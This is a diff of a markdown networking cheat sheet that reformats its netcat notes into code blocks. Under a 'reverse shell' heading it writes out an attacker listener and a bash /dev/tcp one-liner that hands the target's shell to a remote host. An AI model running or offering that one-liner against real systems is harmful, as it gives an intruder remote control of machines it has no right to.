@@ -88,25 +88,30 @@ ISP - internet service provider
 
 # nc  - netcat
 ### connect two computers
-server
 
-    nc -l 1337
+`-u` - `UDP` instead of `TCP` is used
+
+server
+```bash
+nc -l 1337
+```
 
 client
-
-    nc ipaddr 1337
-
+```bash
+nc ipaddr 1337
+```
 
 ### reverse shell
 
 attacker
-
-    nc -l -v -n -p 3000
+```bash
+nc -l -v -n -p 3000
+```
 
 target
-
-    /bin/bash - i >& /dev/tcp/ip/port 0>&1
-
+```bash
+/bin/bash - i >& /dev/tcp/ip/port 0>&1
+```
 
 
 # telnet host port
